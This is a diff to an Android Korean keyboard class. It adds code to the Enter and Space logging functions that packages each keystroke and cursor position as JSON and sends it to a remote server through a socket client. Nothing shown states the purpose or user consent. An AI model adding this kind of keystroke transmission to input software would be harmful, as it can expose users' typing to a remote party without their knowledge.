@@ -5,21 +5,23 @@ import android.content.SharedPreferences
 import android.content.res.Configuration
 import android.inputmethodservice.Keyboard
 import android.media.AudioManager
-import android.os.*
+import android.os.Build
+import android.os.Handler
+import android.os.SystemClock
+import android.os.VibrationEffect
+import android.os.Vibrator
 import android.util.Log
 import android.view.KeyEvent
 import android.view.LayoutInflater
 import android.view.MotionEvent
 import android.view.View
-import android.view.animation.Animation
 import android.view.inputmethod.InputConnection
 import android.widget.Button
 import android.widget.ImageView
 import android.widget.LinearLayout
-import android.widget.TextView
-import androidx.constraintlayout.widget.ConstraintLayout
 import androidx.core.view.children
 import com.myhome.rpgkeyboard.*
+import org.json.JSONObject
 import java.lang.NumberFormatException
 
 class KeyboardKorean constructor(var context:Context, var layoutInflater: LayoutInflater, var keyboardInterationListener: KeyboardInterationListener){
@@ -30,10 +32,20 @@ class KeyboardKorean constructor(var context:Context, var layoutInflater: Layout
     }
     fun logEnter(cursorPosition: Int){
         Log.d("Enter", "Enter, Cusor Position: ${cursorPosition.toString()}")
+        var josonmessage = JSONObject()
+        josonmessage.put("type", "commit")
+        josonmessage.put("char", "\n")
+        josonmessage.put("cursor", cursorPosition)
+        SocketClient(SERVER_IP, SERVER_PORT, josonmessage).execute()
     }
 
     fun logSpace(cursorPosition: Int){
         Log.d("Space", "Space, Cusor Position: ${cursorPosition.toString()}")
+        var josonmessage = JSONObject()
+        josonmessage.put("type", "commit")
+        josonmessage.put("char", " ")
+        josonmessage.put("cursor", cursorPosition)
+        SocketClient(SERVER_IP, SERVER_PORT, josonmessage).execute()
     }
 
     lateinit var koreanLayout: LinearLayout
